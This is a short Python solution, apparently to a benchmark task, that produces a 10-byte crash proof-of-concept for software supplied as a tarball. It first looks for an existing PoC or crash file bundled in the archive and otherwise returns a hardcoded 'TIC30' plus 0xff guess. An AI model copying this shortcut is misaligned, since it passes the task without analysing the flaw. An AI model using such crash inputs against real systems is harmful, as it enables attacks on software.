import tarfile


class Solution:
    def solve(self, src_path: str) -> bytes:
        # Try to find an existing PoC-like file of length 10 in the tarball
        try:
            with tarfile.open(src_path, "r:*") as tar:
                candidates = []
                for m in tar.getmembers():
                    if not m.isfile():
                        continue
                    if m.size != 10:
                        continue
                    name_lower = m.name.lower()
                    if any(
                        token in name_lower
                        for token in (
                            "poc",
                            "crash",
                            "exploit",
                            "input",
                            "test",
                            "id:",
                            "id_",
                            "id-",
                        )
                    ):
                        candidates.append(m)
                if candidates:
                    candidates.sort(key=lambda mm: mm.name)
                    member = candidates[0]
                    f = tar.extractfile(member)
                    if f is not None:
                        data = f.read()
                        if isinstance(data, bytes) and len(data) == 10:
                            return data
        except Exception:
            # If anything goes wrong while inspecting the tar, just fall back
            pass

        # Fallback: 10-byte PoC with a TIC30-looking prefix and high-value bytes
        return b"TIC30\xff\xff\xff\xff\xff"